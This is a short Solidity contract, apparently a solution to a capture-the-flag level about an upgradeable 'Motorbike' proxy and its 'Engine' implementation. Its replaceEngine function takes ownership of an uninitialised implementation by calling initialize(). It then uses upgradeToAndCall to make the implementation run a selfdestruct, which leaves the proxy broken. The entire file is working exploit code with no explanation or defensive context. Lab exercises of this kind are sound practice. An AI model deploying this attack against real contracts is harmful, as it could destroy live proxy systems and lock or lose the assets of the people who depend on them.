// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IMotorbike {

}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract EngineDestruction {

    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function replaceEngine(address engine) external {
        IEngine(engine).initialize();
        bytes memory data = abi.encodeWithSignature("destruction()");

        IEngine(engine).upgradeToAndCall(address(this), data);
    }

    function destruction() external {   
        selfdestruct(owner);
    }

}